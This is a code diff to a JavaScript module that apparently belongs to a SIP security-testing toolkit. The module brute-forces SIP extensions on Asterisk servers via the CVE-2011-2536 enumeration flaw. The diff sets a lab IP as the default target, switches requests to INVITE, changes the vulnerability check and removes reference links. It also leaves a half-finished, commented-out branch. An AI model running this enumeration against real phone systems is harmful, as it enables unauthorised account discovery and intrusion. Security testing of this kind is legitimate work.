@@ -29,12 +29,12 @@ module.exports = (function () {
     return {
 
         info : {
-            name : 'sipBruteExt',
-            description : 'SIP extension brute-forcer.',
+            name : 'sipBruteExt100',
+            description : 'SIP extension brute-forcer (CVE-2011-2536 / AST-2011-011).',
             options : {
                 target : {
                     description  : 'IP address to attack',
-                    defaultValue : '127.0.0.1',
+                    defaultValue : '172.16.190.137',
                     type         : 'targetIp'
                 },
                 port : {
@@ -64,7 +64,7 @@ module.exports = (function () {
                 },
                 meth : {
                     description  : 'Type of SIP packets to do the requests',
-                    defaultValue : 'REGISTER',
+                    defaultValue : 'INVITE',
                     type         : 'sipRequests'
                 },
                 srcHost : {
@@ -137,7 +137,7 @@ module.exports = (function () {
                     resCode = sipParser.code(finalRes);
 
                     // Checking if vulnerable
-                    if (resCode !== '404') {
+                    if (resCode !== '100') {
                         printer.info('Host not vulnerable (' + options.meth + ')');
                         callback(null, {
                             vulnerable : false,
@@ -163,22 +163,12 @@ module.exports = (function () {
                                     var hasAuth       = true,
                                         partialResult = {};
 
+                                    console.log(res);
+
                                     if (!err) {
                                         finalRes = res.msg;
                                         resCode = sipParser.code(finalRes);
-                                        // CVE-2011-2536, it works if the server has alwaysauthreject=no,
-                                        // which is the default in old Asterisk versions.
-                                        // http://downloads.asterisk.org/pub/security/AST-2009-003.html
-                                        // http://downloads.asterisk.org/pub/security/AST-2011-011.html
-                                        // TODO: No CVE, some links:
-                // http://packetstormsecurity.com/search/?q=francesco+tornieri+SIP+User+Enumeration&s=files
-                // http://packetstormsecurity.com/files/100515/Asterisk-1.4.x-1.6.x-Username-Enumeration.html
-                // http://www.cvedetails.com/cve/CVE-2009-3727/
-                // http://www.cvedetails.com/cve/CVE-2011-2536/
-                // http://www.cvedetails.com/cve/CVE-2011-4597/
-                // https://github.com/jesusprubio/bluebox-ng/blob/master/src/modules/sipBruteExtAst.coffee
-                // https://github.com/jesusprubio/metasploit-sip/blob/master/enumerator_asterisk_nat_peers.rb
-                                        if(['401', '407', '200'].indexOf(resCode) !== -1) {
+                                        if(['401', '200'].indexOf(resCode) !== -1) {
                                             if (resCode === '200') {
                                                 hasAuth = false;
                                             } else {
@@ -191,6 +181,9 @@ module.exports = (function () {
                                                 data      : res.msg
                                             };
                                         }
+//                                        } else if (resCode === '100') {
+//                                            res
+//                                        }
 
                                         // We only add valid extensions to final result
                                         if (Object.keys(partialResult).length !== 0) {
